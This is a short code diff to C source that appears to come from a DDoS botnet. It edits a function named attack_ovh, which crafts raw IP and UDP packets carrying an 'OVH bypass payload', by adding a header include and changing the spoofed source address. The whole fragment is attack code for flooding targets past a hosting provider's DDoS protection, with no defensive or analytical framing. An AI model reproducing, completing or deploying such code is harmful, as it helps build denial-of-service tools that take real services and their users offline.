@@ -5,6 +5,7 @@
 #endif
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
 #include <sys/socket.h>
 #include <linux/ip.h>
 #include <linux/udp.h>
@@ -111,7 +112,7 @@ void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len
     iph->ttl = ip_ttl;
     iph->protocol = IPPROTO_UDP;
     iph->check = 0;
-    iph->saddr = source_ip;
+    iph->saddr = LOCAL_ADDR;
 
     // Setup UDP header with OVH bypass payload
     udph->source = htons(sport);
